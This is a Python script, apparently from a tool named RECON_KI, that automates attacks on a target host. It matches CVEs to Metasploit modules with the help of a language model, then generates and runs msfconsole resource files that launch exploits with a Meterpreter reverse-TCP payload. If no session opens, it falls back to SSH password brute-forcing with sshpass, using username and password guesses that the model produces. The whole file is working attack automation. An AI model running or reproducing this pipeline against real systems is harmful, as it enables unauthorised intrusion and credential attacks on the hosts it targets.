import os
import sys
import subprocess
import re
import json
from datetime import datetime

sys.path.insert(0, os.path.abspath(os.path.join(os.getcwd(), "tools")))
from llm_wrapper import use_llm
from msf_module_matcher import suggest_module
from cve import extract_services

CACHE_FILE = "tools/exploit_module.json"

def validate_module(name):
    if os.path.exists(CACHE_FILE):
        cache = json.load(open(CACHE_FILE))
        if name in cache:
            return cache[name]
    try:
        result = subprocess.run(["msfconsole", "-q", "-x", f"search name:{name}\nexit"],
                                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
                                stdin=subprocess.DEVNULL, text=True, timeout=90)
        valid = name in result.stdout
    except:
        valid = False
    cache = {}
    if os.path.exists(CACHE_FILE):
        cache = json.load(open(CACHE_FILE))
    cache[name] = valid
    with open(CACHE_FILE, "w") as f:
        json.dump(cache, f, indent=2)
    return valid

def extract_sessions(output):
    return re.findall(r"^\s*(\d+)\s+Meterpreter", output, re.M)

def get_superscript_modules(run_path):
    f = os.path.join(run_path, "superscript_class.json")
    if not os.path.exists(f): return []
    try:
        return json.load(open(f)).get("module", [])
    except:
        return []

def generate_rc(target, run_path, modules):
    valid = []
    lines = []
    for m in modules:
        if validate_module(m):
            valid.append(m)
            lines.extend([
                f"use {m}",
                f"set RHOSTS {target}",
                "set LHOST 127.0.0.1",
                "set LPORT 4444",
                "set PAYLOAD linux/x86/meterpreter_reverse_tcp",
                "run"
            ])
    lines += ["sleep 4", "sessions -l", "sessions -K", "exit"]
    rc_path = os.path.join(run_path, "exploit.rc")
    with open(rc_path, "w") as f:
        f.write("\n".join(lines))
    return rc_path, valid

def run_msfconsole(rc_path, run_path, label):
    out = os.path.join(run_path, f"{label}.txt")
    result = subprocess.run(["msfconsole", "-q", "-r", rc_path],
                            stdout=subprocess.PIPE,
                            stderr=subprocess.DEVNULL,
                            stdin=subprocess.DEVNULL,
                            text=True,
                            timeout=180)
    with open(out, "w") as f:
        f.write(result.stdout)
    return result.stdout

def brute_force_ssh(target, run_path, users):
    result_file = os.path.join(run_path, "ssh_brute_result.json")
    results = []
    for entry in users:
        user = entry["user"]
        for pw in entry["passwords"]:
            cmd = f"sshpass -p '{pw}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {user}@{target} whoami"
            try:
                r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=8)
                ok = user in r.stdout.decode()
                results.append({"user": user, "password": pw, "success": ok})
                if ok:
                    break
            except:
                pass
    with open(result_file, "w") as f:
        json.dump(results, f, indent=2)

def suggest_users_from_cves(target, cves):
    ids = list(cves.keys())[:5]
    prompt = f"""Target: {target}
CVEs: {', '.join(ids)}
Suggest usernames and passwords as JSON:
{{ "users": [{{ "user": "...", "passwords": ["..."] }}] }}"""
    result = use_llm("brute_force_usergen", prompt)
    try:
        return json.loads(result.split("\n")[-1]).get("users", [])
    except:
        return []

def run_exploit(target, run_path):
    fallback = False
    cves = {}
    cve_file = os.path.join(run_path, "cve_summary.json")
    if os.path.exists(cve_file):
        cves = json.load(open(cve_file))

    recon_file = os.path.join(run_path, "recon.txt")
    context = ", ".join(extract_services(open(recon_file).read())) if os.path.exists(recon_file) else ""

    suggested_modules = []
    for cve_id in list(cves.keys())[:5]:
        result = suggest_module(cve_id, context)
        if result["valid"]:
            suggested_modules.append(result["module"])
            print(f"[+] Matched {cve_id} → {result['module']} ({result['reason']})")
        else:
            print(f"[!] No valid module found for {cve_id}. Reason: {result['reason']}")

    extra = get_superscript_modules(run_path)
    all_modules = list(set(suggested_modules + extra))

    rc, valid = generate_rc(target, run_path, all_modules)
    output = run_msfconsole(rc, run_path, "exploit")
    sessions = extract_sessions(output)

    fallback = not sessions

    if fallback:
        alt_rc = os.path.join(run_path, "cve2exploit.rc")
        if os.path.exists(alt_rc):
            print("[↩] Fallback: running mapped exploits from cve2exploit.rc ...")
            alt_out = run_msfconsole(alt_rc, run_path, "exploit_cve2map")
            new_sessions = extract_sessions(alt_out)
            if new_sessions:
                sessions = new_sessions
                fallback = False

    if fallback:
        users = suggest_users_from_cves(target, cves)
        brute_force_ssh(target, run_path, users)

    with open(os.path.join(run_path, "exploit_result.json"), "w") as f:
        json.dump({
            "timestamp": str(datetime.now()),
            "modules_checked": all_modules,
            "modules_valid": valid,
            "session_ids": sessions,
            "fallback_used": fallback
        }, f, indent=2)

if __name__ == "__main__":
    t = os.getenv("RECON_KI_TARGET")
    p = os.getenv("RECON_KI_RUN_PATH")
    if not t or not p:
        exit(1)
    run_exploit(t, p)
